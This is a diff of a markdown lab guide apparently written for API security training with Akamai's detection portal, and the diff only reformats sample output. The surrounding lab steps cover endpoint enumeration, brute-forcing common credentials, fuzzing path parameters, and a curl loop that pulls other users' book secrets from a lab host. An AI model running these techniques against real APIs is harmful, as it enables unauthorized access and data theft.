@@ -28,15 +28,11 @@ Resource enumeration enable attackers to find endpoints and increase the attack 
 
 4. The output should look like this:
 
-> Resource: /phpMyAdmin/ | 404
-
-> Resource: /wp/ | 404
-
-> Resource: /wordpress/ | 404
-
-> Resource: /drupal/ | 404
-
-> Resource: /cms/ | 404
+> Resource: /phpMyAdmin/ | 404  
+> Resource: /wp/ | 404  
+> Resource: /wordpress/ | 404  
+> Resource: /drupal/ | 404  
+> Resource: /cms/ | 404  
 
 5. Go to Akamai API Security portal at [Akamai API Security Portal](https://app.neosec.com/)
 6. Log in with lab credentials from Lesson 1
@@ -80,15 +76,15 @@ In brute force attacks, malicious actors try to login to accounts using differen
 
 4. The output should look like:
 
-> root:123456 | {'status': 'fail', 'message': 'Username does not exist'}
-> root:password | {'status': 'fail', 'message': 'Username does not exist'}
-> root:12345678 | {'status': 'fail', 'message': 'Username does not exist'}
-> admin:123456 | {'status': 'fail', 'message': 'Password is not correct for the given username.'}
-> admin:password | {'status': 'fail', 'message': 'Password is not correct for the given username.'}
-> admin:12345678 | {'status': 'fail', 'message': 'Password is not correct for the given username.'}
-> test:123456 | {'status': 'fail', 'message': 'Username does not exist'}
-> test:password | {'status': 'fail', 'message': 'Username does not exist'}
-> test:12345678 | {'status': 'fail', 'message': 'Username does not exist'}
+> root:123456 | {'status': 'fail', 'message': 'Username does not exist'}  
+> root:password | {'status': 'fail', 'message': 'Username does not exist'}  
+> root:12345678 | {'status': 'fail', 'message': 'Username does not exist'}  
+> admin:123456 | {'status': 'fail', 'message': 'Password is not correct for the given username.'}  
+> admin:password | {'status': 'fail', 'message': 'Password is not correct for the given username.'}  
+> admin:12345678 | {'status': 'fail', 'message': 'Password is not correct for the given username.'}  
+> test:123456 | {'status': 'fail', 'message': 'Username does not exist'}  
+> test:password | {'status': 'fail', 'message': 'Username does not exist'}  
+> test:12345678 | {'status': 'fail', 'message': 'Username does not exist'}  
 
 5. Go to Akamai API Security portal at [Akamai API Security Portal](https://app.neosec.com/)
 6. Log in with lab credentials from Lesson 1
@@ -115,10 +111,10 @@ Attackers fuzz path parameters in order to find whether the API is leaking infor
 
 4. The output should look something like:
 
-> {"username": "admin", "email": "admin@mail.com"}
-> { "status": "fail", "message": "User not found"}
-> { "status": "fail", "message": "User not found"}
-> { "status": "fail", "message": "User not found"}
+> {"username": "admin", "email": "admin@mail.com"}  
+> { "status": "fail", "message": "User not found"}  
+> { "status": "fail", "message": "User not found"}  
+> { "status": "fail", "message": "User not found"}  
 
 5. Go to Akamai API Security portal at [Akamai API Security Portal](https://app.neosec.com/)
 6. Log in with lab credentials from Lesson 1
@@ -140,16 +136,17 @@ Attackers fuzz path parameters in order to find whether the API is leaking infor
                 cat ~/API_Sec_Lab/IntruderPayloads/books.txt | while read line; do curl -s -X GET -H 'Connection: close' -H 'Authorization: bearer $sessionid', "message' --insecure "http://<HOST>:<PORT>/books/v1/$(echo $line|tr -d '\n\t\r')" -w '\n'; done
 
 3. The output should look as follows:
-> { "status": "fail", "message": "Book not found!"}
-> { "status": "fail", "message": "Book not found!"}
-> {"book_title": "bookTitle16", "owner": "name1", "secret": "secret for bookTitle16"}
-> { "status": "fail", "message": "Book not found!"}
-> { "status": "fail", "message": "Book not found!"}
-> { "status": "fail", "message": "Book not found!"}
-> { "status": "fail", "message": "Book not found!"}
-> { "status": "fail", "message": "Book not found!"}
-> {"book_title": "bookTitle22", "owner": "admin", "secret": "secret for bookTitle22"}
-> { "status": "fail", "message": "Book not found!"}
+
+> { "status": "fail", "message": "Book not found!"}  
+> { "status": "fail", "message": "Book not found!"}  
+> {"book_title": "bookTitle16", "owner": "name1", "secret": "secret for bookTitle16"}  
+> { "status": "fail", "message": "Book not found!"}  
+> { "status": "fail", "message": "Book not found!"}  
+> { "status": "fail", "message": "Book not found!"}  
+> { "status": "fail", "message": "Book not found!"}  
+> { "status": "fail", "message": "Book not found!"}  
+> {"book_title": "bookTitle22", "owner": "admin", "secret": "secret for bookTitle22"}  
+> { "status": "fail", "message": "Book not found!"}  
 
 4. Go to Akamai API Security portal at [Akamai API Security Portal](https://app.neosec.com/)
 5. Log in with lab credentials from Lesson 1
